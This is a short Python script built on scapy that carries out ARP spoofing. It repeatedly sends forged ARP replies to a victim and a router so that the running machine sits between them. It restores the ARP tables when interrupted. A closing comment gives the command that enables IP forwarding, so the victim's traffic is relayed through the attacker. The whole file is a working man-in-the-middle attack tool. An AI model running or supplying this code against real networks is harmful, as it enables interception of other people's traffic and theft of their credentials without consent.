import scapy.all as scapy

def get_mac_address(ip):
	arp = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	request = broadcast / arp
	answer = scapy.srp(request, verbose=False)[0]

	return answer[0][1].hwsrc

def arp_spoof(victim_ip, spoof_ip):
	victim_mac = get_mac_address(victim_ip)
	packet = scapy.ARP(op=2, hwdst=victim_mac, pdst=victim_ip, psrc=spoof_ip)
	scapy.send(packet, verbose=False)

def restore(target_ip, source_ip):
	target_mac = get_mac_address(target_ip)
	source_mac = get_mac_address(source_ip)

	packet = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, hwsrc=source_mac, psrc=source_ip)
	scapy.send(packet, verbose=False)


if __name__ == '__main__':
	victim_ip = "1.1.1.1"
	router_ip = "1.1.1.2"
	
	try:
		while True:
			arp_spoof(victim_ip, router_ip)
			arp_spoof(router_ip, victim_ip)
	except KeyboardInterrupt:
		restore(victim_ip, router_ip)
		restore(router_ip, victim_ip)
		print("ARP tables restored")


# Note: execute 'echo 1 > /proc/sys/net/ipv4/ip_forward' to forward packages from victim to router
